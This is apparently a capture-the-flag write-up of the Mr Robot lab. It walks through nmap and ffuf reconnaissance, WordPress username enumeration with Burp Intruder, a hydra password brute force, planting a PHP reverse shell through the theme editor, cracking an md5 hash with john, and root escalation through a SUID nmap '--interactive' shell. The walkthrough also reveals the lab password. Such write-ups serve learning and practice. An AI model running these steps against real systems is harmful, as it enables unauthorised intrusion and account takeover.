- First we start with an nmap scan :
```bash
❯ nmap -sCV 10.10.33.130
```

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-12 00:31 WAT
Nmap scan report for 10.10.33.130
Host is up (0.18s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE  SERVICE  VERSION
22/tcp  closed ssh
80/tcp  open   http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open   ssl/http Apache httpd
|_http-server-header: Apache
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
|_http-title: Site doesn't have a title (text/html).

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 38.06 seconds
```
- we have http ports open `80/443`

- upon navigating to the web-server i was introduced with a slick `MR-ROBOTS` theme boot-up 
- there pre-defined commands that the web-app takes in, i run them all but nothing much to get there only clips of the Movie showed up.
![](https://i.imgur.com/8CXWjIA.png)

- so i fuzz for hidden directories and found a quick-win `robots.txt`
```bash
❯ ffuf -u http://10.10.33.130/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 403,301 -e .txt,.bak,.php
```

![](https://i.imgur.com/WP2EWvg.png)

- upon navigating to the `/robots.txt` Directory i found two entries `fsocity.dic` and `the first key` 
![](https://i.imgur.com/FUcGeQI.png)

- the first key 
![](https://i.imgur.com/4Jv2FGu.png)

- `fsocity.dic` contains a very long list of words `wordlist`
![](https://i.imgur.com/kKt5g5Z.png)

- i `wget` the wordlist to download it to my machine
![](https://i.imgur.com/NhEc3wa.png)

- moving on to the second more valuable directory found from earlier fuzzing `/wp-login.php` 
![](https://i.imgur.com/2zwa0sT.png)

- testing out default creds didn't work 
- so i start up burpsuite to see out my request are being handled
![](https://i.imgur.com/7otgsY9.png)


![](https://i.imgur.com/mlOPnto.png)

- after Forwarding the request it web-server return a `not-normal` Error message
- `Invalid Username`  which tells me i can send more request with different value as the  `usernames` filed and filter for a different error message 
![](https://i.imgur.com/3KlJJTb.png)

- i intercepted another request and forward it to Intruder 
- i added `payload` to the username value
- and attack type is `sniper`
![](https://i.imgur.com/0kvfRqV.png)

- on the payloads tab i loaded the `fsocity.dic` file 
- then i start the attack
![](https://i.imgur.com/lPVGhxR.png)

- as the attack was running i filter the arrangement by `Length` 
- and the words with a different length size is  `elliot` in different CASES 
![](https://i.imgur.com/swqUWV3.png)

- going back to the web-server and testing the login form with username as `elliot` and password as </anything\> i got a different error message
![](https://i.imgur.com/RTsxyAV.png)

- now i can use a tool like `hydra` to bruteforce the `password` filed withe the same wordlist
- this will consume alot of `CPU` and `TIME` as the wordlist is very big
- but i have provided the password here to save that time!

```bash
❯ hydra -l Elliot -P ~/Downloads/fsocity.dic 10.10.33.130 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30

ER28-0652
```
- upon log-in i see that the user has the permission to edit the `THEME PAGES` 
![](https://i.imgur.com/RI2YaWo.png)

- i Clicked on the editor to edit the `archive.php` file and change it to a `php` reverse shell
![](https://i.imgur.com/2PuXlGJ.png)

- click update file now and navigate to `http://IP/wp-content/themes/twentyfifteen/archive.php` 
- but make sure your listener is ready to catch the shell on the specified port.
![](https://i.imgur.com/84A9237.png)

- navigating to the `robots` users directory i found the second key but i was unable to read it 
- but there is another file that i can read and it contains a `md5` hash of the robots user 
![](https://i.imgur.com/Tqc2RlI.png)

- i copied it , saved it into a file to crack it with `johntheripper`
```bash
john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt rohash.txt 
```

![](https://i.imgur.com/mQxxds2.png)

- now we have the clear text password for the `robots` user
- i just need to switch user and read the key file but first:

stabilize shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

- second key 
![](https://i.imgur.com/DAzjCXx.png)

#### privesc

- i searched for files with `suid bit set` 
```bash
find / -perm -4000 -type f 2>/dev/null
```

![](https://i.imgur.com/TvpYVUc.png)

- found an abnormal file `*/*/nmap`
- then i head over to GTF0bins and searched for nmap and found couple of payloads
- the one that worked while i was trying is the `nmap interactive reverse shell`

![](https://i.imgur.com/KGmmRuW.png)

```
nmap --interactive
nmap> !sh
```

- and `BANKAI` we got the last key 
![](https://i.imgur.com/6O9Ti1o.png)

### Thanks For Reading
